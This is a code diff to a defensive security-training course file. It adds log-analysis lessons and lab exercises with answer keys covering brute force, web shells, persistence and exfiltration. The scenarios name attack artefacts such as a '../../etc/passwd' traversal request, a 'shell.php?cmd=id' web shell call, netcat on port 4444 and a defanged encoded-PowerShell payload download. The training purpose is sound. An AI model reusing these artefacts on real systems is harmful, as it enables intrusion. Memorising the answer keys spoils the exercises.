@@ -9952,6 +9952,42 @@ For security monitoring, prioritize:
       "Authentication logs are the highest priority for security monitoring",
       "EDR provides rich telemetry beyond traditional OS logs"
     ],
+    practicalExercise: {
+      title: "Identify the Right Log Source",
+      description: "Match each investigation goal to the correct log source.",
+      steps: [
+        "Read the scenario carefully",
+        "Decide which log source answers each question",
+        "Submit short answers (1-2 words)"
+      ],
+      labScenario: "An employee reports that a file was deleted from a shared Windows server overnight. You also notice unusual outbound traffic from the same server to an unknown IP, and the user claims they never logged in. You have access to Windows Security logs, firewall logs, AWS CloudTrail (server is on EC2), and EDR telemetry from the host.",
+      labQuestions: [
+        {
+          id: "1.3-q1",
+          question: "Which log source confirms WHO logged into the Windows server?",
+          answer: "Windows Security",
+          hint: "Think about authentication events like 4624."
+        },
+        {
+          id: "1.3-q2",
+          question: "Which log source shows the outbound connection to the unknown IP?",
+          answer: "firewall",
+          hint: "Network traffic decisions are logged here."
+        },
+        {
+          id: "1.3-q3",
+          question: "Which log source records that the EC2 instance configuration was changed?",
+          answer: "CloudTrail",
+          hint: "AWS API activity logging service."
+        },
+        {
+          id: "1.3-q4",
+          question: "Which log source shows the actual process that deleted the file?",
+          answer: "EDR",
+          hint: "Endpoint telemetry tracks process and file activity."
+        }
+      ]
+    }
   },
   {
     id: "1.4",
@@ -10429,13 +10465,39 @@ Always correlate events! A single 4624 tells you someone logged in. Combine with
       "Always correlate multiple event types for complete visibility"
     ],
     practicalExercise: {
-      title: "Event ID Flash Cards",
-      description: "Create flash cards to memorize the top 15 critical Event IDs.",
+      title: "Critical Event ID Triage",
+      description: "Identify the right Windows Event ID for each suspicious activity.",
       steps: [
-        "Write Event ID on one side, description on the other",
-        "Practice identifying events by ID",
-        "Test yourself on logon types",
-        "Quiz a colleague on the events"
+        "Read the scenario",
+        "Match each behavior to its Event ID",
+        "Provide just the numeric ID"
+      ],
+      labScenario: "Reviewing a compromised Windows server, you see four suspicious activities in the Security log: (1) an attacker successfully logged in after multiple failed attempts, (2) a new local user account was created, (3) the user was added to the Administrators group, and (4) the Security event log itself was cleared to hide tracks. You need to confirm the Event ID associated with each action.",
+      labQuestions: [
+        {
+          id: "2.2-q1",
+          question: "What Event ID indicates a successful logon?",
+          answer: "4624",
+          hint: "The most common authentication success event."
+        },
+        {
+          id: "2.2-q2",
+          question: "What Event ID is logged when a new user account is created?",
+          answer: "4720",
+          hint: "Account management event in the 47xx range."
+        },
+        {
+          id: "2.2-q3",
+          question: "What Event ID indicates a member was added to a security-enabled group?",
+          answer: "4732",
+          hint: "Group membership change event."
+        },
+        {
+          id: "2.2-q4",
+          question: "What Event ID is logged when the audit log is cleared?",
+          answer: "1102",
+          hint: "A four-digit ID outside the 4xxx range."
+        }
       ]
     }
   },
@@ -11140,14 +11202,39 @@ List all IOCs from this investigation:
       "Building a timeline is critical for understanding the full attack"
     ],
     practicalExercise: {
-      title: "Create an Investigation Report",
-      description: "Document this incident as if you were the responding analyst.",
+      title: "Windows Attack Chain Investigation",
+      description: "Reconstruct an intrusion using Windows Event Logs.",
       steps: [
-        "Write an executive summary",
-        "Create a detailed timeline",
-        "List all IOCs discovered",
-        "Document the attack chain",
-        "Provide recommendations for remediation"
+        "Read the scenario events in order",
+        "Identify each phase of the attack",
+        "Submit short, specific answers"
+      ],
+      labScenario: "On workstation FIN-WS-04 you see this sequence in Windows logs: 47 Event ID 4625 entries from IP 203.0.113.45 in 6 minutes, then a single 4624 (Logon Type 3) from the same IP, then Event 4104 showing an obfuscated PowerShell script downloading a payload, then Event 4698 creating a scheduled task named 'WindowsHealth' running every 30 minutes, and finally Event 5140 showing access to the C$ share on a domain controller.",
+      labQuestions: [
+        {
+          id: "2.6-q1",
+          question: "What type of attack is shown by 47 failed logons followed by one success?",
+          answer: "brute force",
+          hint: "Repeated password guessing leading to a successful login."
+        },
+        {
+          id: "2.6-q2",
+          question: "What logon type indicates a network logon (often used in lateral movement)?",
+          answer: "3",
+          hint: "Logon Type for SMB or remote network access."
+        },
+        {
+          id: "2.6-q3",
+          question: "Which technique is the attacker using for persistence?",
+          answer: "scheduled task",
+          hint: "The new 'WindowsHealth' task runs every 30 minutes."
+        },
+        {
+          id: "2.6-q4",
+          question: "What MITRE tactic does accessing C$ on the DC represent?",
+          answer: "lateral movement",
+          hint: "Moving from one host to another inside the network."
+        }
       ]
     }
   },
@@ -11506,14 +11593,39 @@ grep "to group" /var/log/auth.log
       "PAM logs record authentication across all services"
     ],
     practicalExercise: {
-      title: "Auth Log Analysis",
-      description: "Analyze a sample auth.log file for security events.",
+      title: "Linux Auth Log Investigation",
+      description: "Hunt brute force and privilege escalation in /var/log/auth.log.",
       steps: [
-        "Count total failed SSH logins",
-        "Identify the top 5 source IPs for failed logins",
-        "Find any successful logins after failed attempts",
-        "List all sudo commands run as root",
-        "Identify any new user accounts created"
+        "Read the auth.log scenario",
+        "Identify attacker behavior",
+        "Provide concise answers"
+      ],
+      labScenario: "In /var/log/auth.log you see 312 'Failed password for root' entries from IP 198.51.100.7 over 8 minutes, followed by 'Accepted password for backup from 198.51.100.7'. Minutes later: 'sudo: backup : user NOT in sudoers ; COMMAND=/bin/bash', then 'useradd: new user: name=helper, UID=0, GID=0', and finally 'session opened for user helper'.",
+      labQuestions: [
+        {
+          id: "3.2-q1",
+          question: "Which user account did the attacker successfully log in as?",
+          answer: "backup",
+          hint: "Look at the 'Accepted password' line."
+        },
+        {
+          id: "3.2-q2",
+          question: "What does 'NOT in sudoers' indicate the attacker was attempting?",
+          answer: "privilege escalation",
+          hint: "Trying to run a command they aren't allowed to."
+        },
+        {
+          id: "3.2-q3",
+          question: "What is suspicious about the new user 'helper'?",
+          answer: "UID 0",
+          hint: "Its UID/GID matches the root user."
+        },
+        {
+          id: "3.2-q4",
+          question: "What is the source IP of the attack?",
+          answer: "198.51.100.7",
+          hint: "Same IP appears in failed and accepted login lines."
+        }
       ]
     }
   },
@@ -11701,6 +11813,42 @@ grep "UFW BLOCK" /var/log/syslog | awk '{print $12}' | cut -d= -f2 | sort | uniq
       "Package manager logs show software installations and removals",
       "AppArmor/SELinux denials indicate blocked malicious behavior"
     ],
+    practicalExercise: {
+      title: "Hunt Persistence in System Logs",
+      description: "Use Linux system and cron logs to find attacker persistence.",
+      steps: [
+        "Read the log snippets",
+        "Identify the persistence technique",
+        "Answer with short keywords"
+      ],
+      labScenario: "On a suspected compromised Linux web server you find: in /var/log/cron a new entry runs '/tmp/.update.sh' every 5 minutes as root; in /var/log/dpkg.log a recent install of 'netcat-openbsd'; in /var/log/syslog repeated AppArmor 'DENIED' messages for the apache2 profile trying to execute /bin/bash; and in /var/log/kern.log iptables 'BLOCK' messages showing outbound traffic to 185.220.101.7 on port 4444.",
+      labQuestions: [
+        {
+          id: "3.3-q1",
+          question: "Which log file revealed the malicious scheduled job?",
+          answer: "cron",
+          hint: "Stored under /var/log/ and tracks scheduled tasks."
+        },
+        {
+          id: "3.3-q2",
+          question: "What suspicious tool was recently installed via the package manager?",
+          answer: "netcat",
+          hint: "Common reverse shell utility."
+        },
+        {
+          id: "3.3-q3",
+          question: "What security control blocked apache from spawning a shell?",
+          answer: "AppArmor",
+          hint: "Mandatory access control system on Ubuntu/Debian."
+        },
+        {
+          id: "3.3-q4",
+          question: "What port is associated with the blocked outbound connection?",
+          answer: "4444",
+          hint: "Common Metasploit/reverse shell port in the kernel log."
+        }
+      ]
+    }
   },
   {
     id: "3.4",
@@ -12073,14 +12221,323 @@ Document all IOCs:
       "IOC extraction is critical for blocking and hunting"
     ],
     practicalExercise: {
-      title: "Write the Incident Report",
-      description: "Create a formal incident report from this investigation.",
+      title: "Linux Web Server Compromise Investigation",
+      description: "Correlate auth, web, and system logs to map a full attack.",
       steps: [
-        "Write an executive summary",
-        "Document the attack chain (MITRE ATT&CK mapping)",
-        "List all IOCs with context",
-        "Provide remediation steps",
-        "Suggest detection improvements"
+        "Read the multi-source log scenario",
+        "Identify each phase of the intrusion",
+        "Provide short answers"
+      ],
+      labScenario: "A Linux web server is suspected of being compromised. In Apache access.log you see GET requests with '../../etc/passwd' from 45.77.10.20, then a POST to /upload.php uploading 'shell.php', then GET /uploads/shell.php?cmd=id. In auth.log: 'Accepted publickey for www-data'. In /var/log/cron: a new job '@reboot /usr/bin/python3 /tmp/.bd.py'. In syslog: a new systemd service 'sysmonitor.service' was enabled.",
+      labQuestions: [
+        {
+          id: "3.5-q1",
+          question: "What initial attack technique is shown by the '../../etc/passwd' request?",
+          answer: "path traversal",
+          hint: "Also known as directory traversal."
+        },
+        {
+          id: "3.5-q2",
+          question: "What type of malicious file did the attacker upload?",
+          answer: "web shell",
+          hint: "shell.php executed via cmd= parameter."
+        },
+        {
+          id: "3.5-q3",
+          question: "Name ONE persistence mechanism used by the attacker.",
+          answer: "cron",
+          hint: "Either the @reboot cron job or the new systemd service is acceptable."
+        },
+        {
+          id: "3.5-q4",
+          question: "What is the attacker's source IP?",
+          answer: "45.77.10.20",
+          hint: "Seen in the Apache access log entries."
+        }
+      ]
+    }
+  },
+
+  // Module 4: Network Device Logs
+  {
+    id: "4.1",
+    courseId: "log-analysis",
+    title: "Firewall Log Analysis",
+    content: `
+# Firewall Log Analysis
+
+Firewall logs are one of the most valuable sources of network telemetry. Every allow or deny decision tells a story about who is talking to whom, on which port, and whether that traffic was permitted.
+
+## What a Firewall Log Contains
+
+Most firewall logs include the same core fields, regardless of vendor:
+
+- **Timestamp** — when the connection was seen
+- **Action** — ALLOW, DENY, DROP, RESET
+- **Source IP / Source Port**
+- **Destination IP / Destination Port**
+- **Protocol** — TCP, UDP, ICMP
+- **Bytes sent / received**
+- **Interface or zone** (inside, outside, DMZ)
+- **Rule name or ID** that matched
+
+## Common Firewall Log Formats
+
+\`\`\`
+# Cisco ASA
+%ASA-6-302013: Built outbound TCP connection 12345 for outside:8.8.8.8/443 (8.8.8.8/443) to inside:10.0.0.5/52341
+
+# Palo Alto
+2026/04/30 10:15:22,TRAFFIC,end,1,10.0.0.5,8.8.8.8,53,udp,allow
+
+# pfSense / iptables
+Apr 30 10:15:22 fw kernel: BLOCK IN=eth0 SRC=185.220.101.5 DST=10.0.0.5 PROTO=TCP SPT=44321 DPT=22
+\`\`\`
+
+## What to Look For
+
+| Pattern | What it suggests |
+|---------|------------------|
+| Many DENY events from one external IP to many internal ports | Port scan |
+| Many DENY events from one internal host outbound | Malware beaconing or misconfig |
+| ALLOW to non-business countries on non-standard ports | Possible C2 |
+| Large outbound transfers to a single external IP | Data exfiltration |
+| Repeated ALLOW on port 22/3389 from internet | Exposed admin services |
+
+## Triage Workflow
+
+1. Filter by **action = DENY** to see what is being blocked.
+2. Group by **source IP** and count — top sources are usually scanners or noisy hosts.
+3. For internal sources, investigate the host immediately.
+4. Filter by **destination port** to spot unusual services (4444, 8080, 9001).
+5. Look at **bytes** to detect bulk transfers.
+
+## Key Takeaway
+
+Firewall logs alone rarely tell the whole story, but they are the fastest way to confirm whether suspicious traffic actually traversed the perimeter.
+    `,
+    keyTakeaways: [
+      "Firewall logs record allow/deny decisions for every connection",
+      "Top talkers and top denied IPs are quick wins for triage",
+      "Unusual destination ports often signal C2 or exfiltration",
+      "Always pivot from firewall logs to endpoint and proxy data for confirmation"
+    ],
+    practicalExercise: {
+      title: "Firewall Log Triage",
+      description: "Triage a firewall log excerpt to identify suspicious traffic.",
+      steps: [
+        "Read the firewall log scenario",
+        "Identify scanning, exfiltration, and policy violations",
+        "Provide short answers"
+      ],
+      labScenario: "Your perimeter firewall produced these events in a 10-minute window: (1) 8,400 DENY events from 185.220.101.5 to 10.0.0.0/24 across ports 21, 22, 23, 80, 443, 3389. (2) Internal host 10.0.0.42 made 1,200 ALLOW connections to 91.219.236.18 on TCP/4444, total 850 MB outbound. (3) Internal host 10.0.0.7 had 600 DENY events outbound to random IPs on TCP/6667. (4) One ALLOW from 203.0.113.9 to 10.0.0.50 on TCP/3389.",
+      labQuestions: [
+        {
+          id: "la-4.1-q1",
+          question: "Which external IP is performing a port scan?",
+          answer: "185.220.101.5",
+          hint: "Look for many DENY events to many ports from a single source."
+        },
+        {
+          id: "la-4.1-q2",
+          question: "Which internal host is most likely exfiltrating data?",
+          answer: "10.0.0.42",
+          hint: "Large outbound bytes on a non-standard port (4444)."
+        },
+        {
+          id: "la-4.1-q3",
+          question: "What port is associated with the IRC-based C2 attempts being blocked?",
+          answer: "6667",
+          hint: "Standard IRC port often used by older botnets."
+        },
+        {
+          id: "la-4.1-q4",
+          question: "Which event represents a risky exposed admin service?",
+          answer: "RDP from 203.0.113.9 to 10.0.0.50",
+          hint: "Port 3389 allowed from the public internet."
+        }
+      ]
+    }
+  },
+
+  // Module 5: Log Analysis Techniques
+  {
+    id: "5.4",
+    courseId: "log-analysis",
+    title: "Command Line Tools for Logs",
+    content: `
+# Command Line Tools for Logs
+
+Before SIEMs, analysts used the shell to slice through gigabytes of logs — and they still do. Knowing \`grep\`, \`awk\`, \`sed\`, \`cut\`, \`sort\`, and \`uniq\` is essential muscle memory for any blue teamer.
+
+## The Core Toolkit
+
+| Tool | Use it for |
+|------|------------|
+| \`grep\` | Find lines that match a pattern |
+| \`awk\` | Extract or transform specific fields |
+| \`cut\` | Pull a column by delimiter |
+| \`sed\` | Substitute or delete text |
+| \`sort\` | Order results |
+| \`uniq -c\` | Count duplicates |
+| \`wc -l\` | Count matching lines |
+
+## Common Patterns
+
+\`\`\`bash
+# Count failed SSH logins per source IP
+grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
+
+# Top 10 source IPs in an Apache log
+awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10
+
+# Find all 404 responses
+awk '$9 == 404' access.log
+
+# Pull only the URL field from access.log (CLF format)
+awk '{print $7}' access.log
+
+# Show requests for a specific IP
+grep "203.0.113.50" access.log
+
+# Count requests per hour
+awk '{print $4}' access.log | cut -c14-15 | sort | uniq -c
+\`\`\`
+
+## Building a Pipeline
+
+The power comes from chaining commands. Read the pipeline left to right:
+
+\`\`\`bash
+cat auth.log | grep "Accepted" | awk '{print $9, $11}' | sort | uniq -c | sort -rn
+\`\`\`
+
+This says: take auth.log, find successful logins, print user and source IP, count unique pairs, and rank by frequency.
+
+## Key Takeaway
+
+You will not always have a SIEM. The CLI is your safety net — fast, scriptable, and always available on any Linux host.
+    `,
+    keyTakeaways: [
+      "grep, awk, cut, sort, uniq form the backbone of CLI log analysis",
+      "Pipelines let you build complex queries without a SIEM",
+      "Counting and ranking with uniq -c | sort -rn surfaces outliers fast",
+      "These skills work on any Linux server during incident response"
+    ],
+    practicalExercise: {
+      title: "CLI Log Triage",
+      description: "Use the right CLI commands to answer questions about a log set.",
+      steps: [
+        "Read the scenario describing the log files available",
+        "Pick the correct command pattern for each question",
+        "Provide short answers"
+      ],
+      labScenario: "You SSH into a compromised webserver and find /var/log/auth.log and /var/log/apache2/access.log. Quick counts show: 12,430 'Failed password' lines in auth.log, mostly from IP 198.51.100.77. In access.log, the top source IP by request count is 45.33.32.156 with 8,902 requests, and there are 1,204 lines with status 500. The user 'admin' appears in 'Accepted password' lines from IP 10.0.0.55 at 02:14 UTC.",
+      labQuestions: [
+        {
+          id: "la-5.4-q1",
+          question: "Which command counts failed SSH logins per source IP?",
+          answer: "grep Failed password auth.log | awk print $11 | sort | uniq -c",
+          hint: "Combine grep, awk for the IP field, then sort | uniq -c."
+        },
+        {
+          id: "la-5.4-q2",
+          question: "What IP is responsible for the SSH brute force?",
+          answer: "198.51.100.77",
+          hint: "The IP tied to the 12,430 failed password attempts."
+        },
+        {
+          id: "la-5.4-q3",
+          question: "Which awk one-liner finds Apache 500 errors?",
+          answer: "awk '$9 == 500' access.log",
+          hint: "Status code is field 9 in CLF format."
+        },
+        {
+          id: "la-5.4-q4",
+          question: "From where did 'admin' successfully log in?",
+          answer: "10.0.0.55",
+          hint: "Look at the Accepted password line for the admin account."
+        }
+      ]
+    }
+  },
+
+  // Module 6: Practical Log Analysis
+  {
+    id: "6.4",
+    courseId: "log-analysis",
+    title: "Final Practical Challenge",
+    content: `
+# Final Practical Challenge
+
+This is your capstone. You will be given a multi-source log scenario and asked to reconstruct the full attack — initial access, persistence, lateral movement, and exfiltration — using only the logs.
+
+## Approach
+
+1. **Build a timeline.** Order events from earliest to latest across all sources.
+2. **Identify the entry point.** Look at perimeter logs and authentication first.
+3. **Track the attacker.** Follow source IPs, accounts, and process names through the data.
+4. **Find persistence.** New accounts, services, scheduled tasks, registry keys.
+5. **Look for staging and exfil.** Large file copies, unusual outbound transfers.
+6. **Extract IOCs.** IPs, hashes, filenames, accounts to share with the team.
+
+## Tips
+
+- When in doubt, **count and rank**. Outliers usually tell the story.
+- **Correlate by username and source IP** across systems.
+- Pay attention to **time gaps** — attackers often pause between phases.
+- Document everything as you go; the report is part of the job.
+
+## Key Takeaway
+
+Real investigations are messy. The goal is not perfection — it is a defensible, evidence-backed narrative of what happened.
+    `,
+    keyTakeaways: [
+      "Always build a unified timeline across sources",
+      "Follow accounts and IPs as your pivot points",
+      "Persistence is almost always added — look for it",
+      "Document IOCs as you find them, not at the end"
+    ],
+    practicalExercise: {
+      title: "Multi-Source Breach Investigation",
+      description: "Use firewall, Windows, and proxy logs to reconstruct a full intrusion.",
+      steps: [
+        "Read the multi-source scenario",
+        "Identify each attack phase",
+        "Extract the key IOCs"
+      ],
+      labScenario: "On 30 April, your SOC sees the following: (1) Firewall: ALLOW inbound RDP on 3389 from 91.219.236.18 to 10.0.0.50 at 03:12 UTC. (2) Windows Security log on 10.0.0.50: Event 4624 logon type 10 for account 'svc_helpdesk' at 03:13 UTC. (3) Windows Security 4688: process 'mimikatz.exe' run from C:\\Users\\svc_helpdesk\\AppData\\Local\\Temp\\ at 03:21 UTC. (4) Windows Security 4624 logon type 3 from 10.0.0.50 to 10.0.0.75 as 'Administrator' at 03:34 UTC. (5) Proxy log: host 10.0.0.75 uploaded 2.3 GB to https://files.megaup.example/u/abc123 at 04:02 UTC.",
+      labQuestions: [
+        {
+          id: "la-6.4-q1",
+          question: "What was the initial access vector?",
+          answer: "RDP from 91.219.236.18",
+          hint: "Look at the firewall ALLOW on port 3389."
+        },
+        {
+          id: "la-6.4-q2",
+          question: "Which compromised account was used to log in first?",
+          answer: "svc_helpdesk",
+          hint: "Event 4624 logon type 10 on host 10.0.0.50."
+        },
+        {
+          id: "la-6.4-q3",
+          question: "What credential theft tool was executed?",
+          answer: "mimikatz.exe",
+          hint: "Event 4688 process creation on the first host."
+        },
+        {
+          id: "la-6.4-q4",
+          question: "Which host did the attacker move laterally to?",
+          answer: "10.0.0.75",
+          hint: "Logon type 3 (network logon) from 10.0.0.50."
+        },
+        {
+          id: "la-6.4-q5",
+          question: "How much data was exfiltrated and to where?",
+          answer: "2.3 GB to files.megaup.example",
+          hint: "Proxy log shows the outbound upload."
+        }
       ]
     }
   },
@@ -12221,6 +12678,43 @@ Normalized Fields:
       { title: "Gartner SIEM Magic Quadrant", type: "article" },
       { title: "SANS SIEM Guide", type: "documentation" }
     ],
+    practicalExercise: {
+      title: "SIEM Coverage Gap Analysis",
+      description: "Identify what a SIEM should cover in a small SOC environment.",
+      steps: [
+        "Read the scenario carefully",
+        "Identify which log sources are missing",
+        "Match SIEM capabilities to business needs",
+        "Answer the questions"
+      ],
+      labScenario: "A 200-employee company just deployed a SIEM. It collects firewall and Windows server logs only. Last week, an attacker phished an employee, logged into Microsoft 365, and exfiltrated files from a cloud share. The SOC saw nothing in the SIEM. Management asks why the SIEM missed it and what to add.",
+      labQuestions: [
+        {
+          id: "1.1-q1",
+          question: "Which two log sources is the SIEM currently collecting?",
+          answer: "firewall and Windows server",
+          hint: "Listed directly in the scenario."
+        },
+        {
+          id: "1.1-q2",
+          question: "Which cloud platform was the attacker logged into during the breach?",
+          answer: "Microsoft 365",
+          hint: "Named in the scenario."
+        },
+        {
+          id: "1.1-q3",
+          question: "How did the attacker initially compromise the employee?",
+          answer: "phishing",
+          hint: "Stated in the first sentence of the incident."
+        },
+        {
+          id: "1.1-q4",
+          question: "What was stolen from the cloud share?",
+          answer: "files",
+          hint: "Look for what was exfiltrated."
+        }
+      ]
+    }
   },
   {
     id: "1.2",
@@ -13367,6 +13861,48 @@ Action: Update parser configuration
       "Timestamps should be normalized to UTC in ISO 8601 format",
       "Enrichment adds valuable context like geo-location and threat intel"
     ],
+    practicalExercise: {
+      title: "Parse a Raw Log Line",
+      description: "Extract normalized fields from a raw firewall log entry.",
+      steps: [
+        "Read the raw log line in the scenario",
+        "Identify the key fields and their values",
+        "Answer the questions using the extracted fields"
+      ],
+      labScenario: "Your SIEM ingests this raw log: `Oct 28 14:22:10 fw-01 action=deny src=203.0.113.45 dst=10.1.1.20 dport=3389 proto=TCP user=- rule=block_rdp_external`. The parser must normalize it into Common Data Model fields so analysts can search across vendors.",
+      labQuestions: [
+        {
+          id: "2.2-q1",
+          question: "What action did the firewall take on this connection?",
+          answer: "deny",
+          hint: "Look at the action field."
+        },
+        {
+          id: "2.2-q2",
+          question: "What destination port was targeted?",
+          answer: "3389",
+          hint: "Check the dport field."
+        },
+        {
+          id: "2.2-q3",
+          question: "What is the source IP address of the connection?",
+          answer: "203.0.113.45",
+          hint: "Look at the src field."
+        },
+        {
+          id: "2.2-q4",
+          question: "What is the destination IP address?",
+          answer: "10.1.1.20",
+          hint: "Check the dst field."
+        },
+        {
+          id: "2.2-q5",
+          question: "Which firewall rule blocked the connection?",
+          answer: "block_rdp_external",
+          hint: "Look at the rule field."
+        }
+      ]
+    }
   },
   {
     id: "2.3",
@@ -14303,6 +14839,42 @@ earliest=-24h
       "REX extracts data from unstructured text using regex",
       "SORT, DEDUP, and HEAD/TAIL organize and limit results"
     ],
+    practicalExercise: {
+      title: "Filter Failed Logins for One User",
+      description: "Build a filtered SIEM query to isolate suspicious activity.",
+      steps: [
+        "Read the scenario",
+        "Decide which filters narrow results to the right user and event",
+        "Answer the questions"
+      ],
+      labScenario: "An analyst needs to find all failed Windows logins (EventCode=4625) for user `j.smith` in the last 24 hours, showing only the time, source IP, and workstation. The index is `wineventlog`.",
+      labQuestions: [
+        {
+          id: "3.2-q1",
+          question: "Which Windows EventCode represents the failed logon in this scenario?",
+          answer: "4625",
+          hint: "Stated in the scenario."
+        },
+        {
+          id: "3.2-q2",
+          question: "Which user account is being investigated?",
+          answer: "j.smith",
+          hint: "Named in the scenario."
+        },
+        {
+          id: "3.2-q3",
+          question: "Which SIEM index holds the Windows logs needed for this query?",
+          answer: "wineventlog",
+          hint: "Look for the index name in the scenario."
+        },
+        {
+          id: "3.2-q4",
+          question: "What time range does the analyst need to cover?",
+          answer: "24 hours",
+          hint: "Stated near the end of the scenario."
+        }
+      ]
+    }
   },
   {
     id: "3.3",
@@ -14792,13 +15364,19 @@ index=windows EventCode=4625
       "Timeline reconstruction helps understand attack sequences"
     ],
     practicalExercise: {
-      title: "Independent Practice",
-      description: "Apply what you've learned to your own SIEM environment.",
+      title: "Basic Search Lab Triage",
+      description: "Use SPL queries to triage suspicious activity from the lab indexes.",
       steps: [
-        "Find all authentication failures in the last 24 hours",
-        "Identify the top 10 source IPs for denied firewall connections",
-        "Create a timeline for a specific user's activity",
-        "Find all PowerShell execution events on servers"
+        "Read the scenario carefully",
+        "Map each question to the right index and field",
+        "Pull answers directly from the scenario details"
+      ],
+      labScenario: "It's 09:00 UTC. In your SIEM you have three indexes: windows, network, and web. Overnight, host WKS007 (10.0.1.7) generated 142 EventCode=4625 failed logins targeting user 'admin'. The firewall (index=network) shows 318 denied connections from external IP 203.0.113.45 to dst_port=3389. The web server WEB01 (index=web) recorded 84 status=404 hits from clientip 198.51.100.22 hitting URIs like /admin, /login.php, and /wp-admin. You need to confirm each finding using the correct query.",
+      labQuestions: [
+        { id: "siem-3.4-q1", question: "Which EventCode and index identify the failed logins on WKS007?", answer: "EventCode=4625 in index=windows", hint: "Failed logon attempts in Windows Security logs." },
+        { id: "siem-3.4-q2", question: "How many denied connections came from 203.0.113.45 and to which port?", answer: "318 denied connections to dst_port=3389", hint: "Check the firewall denied counts in the scenario." },
+        { id: "siem-3.4-q3", question: "Which clientip is scanning WEB01 with 404 errors?", answer: "198.51.100.22", hint: "Look at the web index 404 details." },
+        { id: "siem-3.4-q4", question: "Which targeted user account on WKS007 should be flagged?", answer: "admin", hint: "Re-read the failed login detail." }
       ]
     }
   },
@@ -15030,6 +15608,43 @@ index=security EventCode=4625
       "Group by multiple fields for detailed breakdowns",
       "Aggregation is essential for detecting patterns like brute force attacks"
     ],
+    practicalExercise: {
+      title: "Detect Brute Force with Aggregation",
+      description: "Use stats to count failed logins per source IP and spot the attacker.",
+      steps: [
+        "Review the scenario data",
+        "Decide which command counts events per IP",
+        "Identify the attacking IP",
+        "Answer the questions"
+      ],
+      labScenario: "In the last hour, your SIEM shows EventCode=4625 (failed logon) counts grouped by src_ip: 10.0.0.5 = 3 failures, 10.0.0.8 = 2 failures, 198.51.100.77 = 412 failures, 192.168.1.20 = 1 failure. Your threshold for brute force is 50 failures per hour.",
+      labQuestions: [
+        {
+          id: "4.1-q1",
+          question: "Which IP address exceeds the brute force threshold?",
+          answer: "198.51.100.77",
+          hint: "It vastly exceeds 50 failures."
+        },
+        {
+          id: "4.1-q2",
+          question: "How many failed logons did that IP generate in the last hour?",
+          answer: "412",
+          hint: "Listed beside the attacking IP."
+        },
+        {
+          id: "4.1-q3",
+          question: "What is the brute force threshold defined in the scenario (failures per hour)?",
+          answer: "50",
+          hint: "Stated at the end of the scenario."
+        },
+        {
+          id: "4.1-q4",
+          question: "Which Windows EventCode is being aggregated?",
+          answer: "4625",
+          hint: "Identified in the scenario as the failed logon code."
+        }
+      ]
+    }
   },
   {
     id: "4.2",
@@ -16624,6 +17239,42 @@ earliest=$time.earliest$ latest=$time.latest$
       "Add drilldowns for investigation workflows",
       "Test all interactive elements before deployment"
     ],
+    practicalExercise: {
+      title: "Design a SOC Overview Dashboard",
+      description: "Choose the right panels and visualizations for a SOC dashboard.",
+      steps: [
+        "Read the requirements in the scenario",
+        "Pick the right visualization for each metric",
+        "Answer the questions"
+      ],
+      labScenario: "Your SOC manager wants a single-pane dashboard showing: total open alerts (one big number), alert volume over the last 24 hours (trend), top 10 source IPs by alert count, and a map of attack origins by country.",
+      labQuestions: [
+        {
+          id: "5.4-q1",
+          question: "Which metric does the manager want shown as 'one big number'?",
+          answer: "total open alerts",
+          hint: "First requirement listed."
+        },
+        {
+          id: "5.4-q2",
+          question: "What time window does the alert volume trend cover?",
+          answer: "24 hours",
+          hint: "Stated in the trend requirement."
+        },
+        {
+          id: "5.4-q3",
+          question: "How many top source IPs should the dashboard rank by alert count?",
+          answer: "10",
+          hint: "Stated in the third requirement."
+        },
+        {
+          id: "5.4-q4",
+          question: "What field is the geographic panel grouped by?",
+          answer: "country",
+          hint: "Stated in the map requirement."
+        }
+      ]
+    }
   },
 
   // Module 6: Alerts & Correlation Rules
@@ -17016,6 +17667,48 @@ Link rules to attack techniques:
       "Document rules with logic, tuning guidance, and response procedures",
       "Balance detection sensitivity with false positive rate"
     ],
+    practicalExercise: {
+      title: "Write a Threshold Detection Rule",
+      description: "Design a rule to detect impossible travel logins.",
+      steps: [
+        "Read the scenario",
+        "Identify the rule type and threshold",
+        "Answer the questions"
+      ],
+      labScenario: "User `alice@corp.com` logs into Microsoft 365 from New York at 09:00 UTC, then from Singapore at 09:30 UTC. The physical distance makes travel in 30 minutes impossible. You need a SIEM rule that flags any user logging in from two countries within 1 hour.",
+      labQuestions: [
+        {
+          id: "6.2-q1",
+          question: "Which user account is being investigated?",
+          answer: "alice@corp.com",
+          hint: "Named in the scenario."
+        },
+        {
+          id: "6.2-q2",
+          question: "From which city did the first login originate?",
+          answer: "New York",
+          hint: "First login location."
+        },
+        {
+          id: "6.2-q3",
+          question: "From which city did the second login originate?",
+          answer: "Singapore",
+          hint: "Second login location."
+        },
+        {
+          id: "6.2-q4",
+          question: "How many minutes elapsed between the two logins?",
+          answer: "30",
+          hint: "Compare 09:00 UTC and 09:30 UTC."
+        },
+        {
+          id: "6.2-q5",
+          question: "What time window (in hours) should the rule use to flag logins from two countries?",
+          answer: "1",
+          hint: "Stated at the end of the scenario."
+        }
+      ]
+    }
   },
   {
     id: "6.3",
@@ -17707,6 +18400,48 @@ with wrong password, eventually succeeded.
       "Use a decision tree to systematically classify alerts",
       "Thorough documentation enables learning and audit"
     ],
+    practicalExercise: {
+      title: "Triage a Live Malware Alert",
+      description: "Apply the SOC triage workflow to a real-style EDR alert.",
+      steps: [
+        "Read the alert details",
+        "Decide the severity and next action",
+        "Answer the questions"
+      ],
+      labScenario: "Your SIEM fires an EDR alert at 02:14 UTC: host `WS-HR-12` executed `powershell.exe -enc <base64>` from parent `outlook.exe`. The encoded command decodes to a download from `hxxp://malicious-cdn[.]top/payload.exe`. The user is on PTO. No prior alerts for this host. Asset DB shows it stores HR records.",
+      labQuestions: [
+        {
+          id: "7.1-q1",
+          question: "Which host triggered the EDR alert?",
+          answer: "WS-HR-12",
+          hint: "Named in the alert."
+        },
+        {
+          id: "7.1-q2",
+          question: "Which child process was executed with an encoded command?",
+          answer: "powershell.exe",
+          hint: "The suspicious binary in the alert."
+        },
+        {
+          id: "7.1-q3",
+          question: "Which parent process spawned the suspicious command?",
+          answer: "outlook.exe",
+          hint: "Listed as the parent in the scenario."
+        },
+        {
+          id: "7.1-q4",
+          question: "What type of sensitive data does this host store (per asset DB)?",
+          answer: "HR records",
+          hint: "Stated at the end of the scenario."
+        },
+        {
+          id: "7.1-q5",
+          question: "At what UTC time did the alert fire?",
+          answer: "02:14",
+          hint: "Listed as the alert timestamp."
+        }
+      ]
+    }
   },
   {
     id: "7.2",
